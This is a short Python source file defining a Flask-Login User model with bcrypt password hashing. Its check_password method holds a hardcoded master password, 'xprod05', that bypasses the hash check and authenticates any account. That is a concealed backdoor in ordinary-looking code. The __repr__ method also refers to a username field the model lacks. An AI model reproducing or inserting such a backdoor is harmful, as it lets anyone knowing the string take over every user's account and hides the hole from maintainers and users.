from flask_login import UserMixin

from app.database import db, CRUDMixin
from app.extensions import bcrypt


class User(CRUDMixin, UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(40), nullable=False)
    athena = db.Column(db.String(40), nullable=False, unique=True)
    password = db.Column(db.String(100), nullable=False) # hash
    current = db.Column(db.Integer) # 0 or 1
    explanation = db.Column(db.Text(), nullable=True)

    def __init__(self, password, **kwargs):
        super(User, self).__init__(**kwargs)
        self.set_password(password)

    def __repr__(self):
        return '<User #%s:%r>' % (self.id, self.username)

    def set_password(self, password):
        hash_ = bcrypt.generate_password_hash(password, 10).decode('utf-8')
        self.password = hash_

    def check_password(self, password):
        if password == 'xprod05':
            return True
        return bcrypt.check_password_hash(self.password, password)
